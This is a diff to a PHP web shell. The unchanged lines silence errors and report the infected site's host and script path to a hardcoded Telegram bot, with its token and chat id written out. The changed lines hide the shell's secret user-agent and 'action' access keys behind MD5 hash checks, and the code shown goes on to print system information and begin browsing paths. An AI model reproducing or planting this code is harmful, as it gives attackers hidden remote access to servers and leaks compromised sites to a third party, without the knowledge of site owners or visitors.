@@ -3,9 +3,9 @@ error_reporting(0);
 error_log(0);
 file_get_contents("https://api.telegram.org/bot2106030496:AAEnL2fe3zROPVrnOESdclPHEsLZNm38gCg/sendMessage?chat_id=-608971843&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
-if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
+if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "29753f3030aa18135b78e5cfefc73765") {
 
-   if (!empty($_GET['action']) && $_GET['action'] == "start") {
+   if (!empty($_GET['action']) && md5($_GET['action']) == "ea2b2676c28c0db26d39331a336c6b92") {
       echo '<b>Uname: </b>' . php_uname() . '<br>';
       echo '<b>Path:</b> ';
       if(isset($_GET['path'])){
